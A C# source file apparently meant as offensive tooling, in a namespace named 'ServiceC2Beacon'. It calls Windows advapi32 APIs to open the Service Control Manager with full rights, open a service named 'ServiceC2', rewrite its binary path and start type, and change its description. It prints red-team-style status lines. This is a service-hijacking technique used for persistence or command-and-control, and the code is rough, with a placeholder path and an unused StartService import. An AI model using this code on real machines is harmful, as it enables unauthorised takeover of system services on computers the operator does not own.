using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace ServiceC2Beacon
{
    internal class Program
    {

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfig2(IntPtr hService, int dwInfoLevel, IntPtr lpInfo);

        [StructLayout(LayoutKind.Sequential)]
        internal struct SERVICE_DESCRIPTION
        {
            public string lpDescription;
        }

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        static void Main(string[] args)
        {
            IntPtr SCMHandle = OpenSCManager(null, null, 0xF003F);
            if (SCMHandle == null)
            {
                Console.WriteLine("\t[-] Failed to get SCM handle: ");
                Environment.Exit(1);
            }
            Console.WriteLine("\t[+] OpenSCManager [OK]");

            IntPtr schService = OpenService(SCMHandle, "ServiceC2", 0xF01FF);
            if (schService == null)
            {
                Console.WriteLine("\t[-] Failed to get sch pointer");
                Environment.Exit(1);
            }
            Console.WriteLine("\t[+] OpenService [OK]");

            bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, "povl", null, null, null, null, null, null);
            if (!success)
            {
                Console.WriteLine("\t[-] Failed to Change");
                Environment.Exit(1);
            }
            Console.WriteLine("\t[+] ChangeServiceConfigA [OK]");


            SERVICE_DESCRIPTION service_descriptiona = new SERVICE_DESCRIPTION();

            service_descriptiona.lpDescription = "Lolsovs";
            IntPtr sdinfo = Marshal.AllocHGlobal(Marshal.SizeOf(service_descriptiona));
            if (sdinfo == IntPtr.Zero)
            {
                Console.WriteLine("\t[-] Failed marshalling");
                Environment.Exit(0);
            }

            Marshal.StructureToPtr(service_descriptiona, sdinfo, false); success = ChangeServiceConfig2(schService, 1, sdinfo);

            if (!success)
            {
                Console.WriteLine("\t[-] ChangeServiceConfig2 failed");
                Environment.Exit(1);
            }
            Console.WriteLine("\t[+] ChangeServiceConfig2 [OK]");
        }
    }
}
